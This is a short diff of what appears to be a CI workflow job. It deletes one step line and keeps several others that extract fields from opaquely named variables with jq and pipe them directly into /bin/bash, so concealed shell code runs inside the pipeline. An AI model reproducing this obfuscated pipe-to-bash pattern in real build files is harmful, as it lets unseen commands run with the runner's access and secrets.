@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$p28" | jq -r .s603 | /bin/bash
           printf '%s' "$n307" | jq -r .dll660 | /bin/bash
           echo $cy38456 | jq -r .xbi4 | /bin/bash
-          printf '%s' "$mb74904" | jq -r .yyc341 | /bin/bash
           printf '%s' "$n05" | jq -r .gwkzs6 | /bin/bash
 
       - name: Upload results
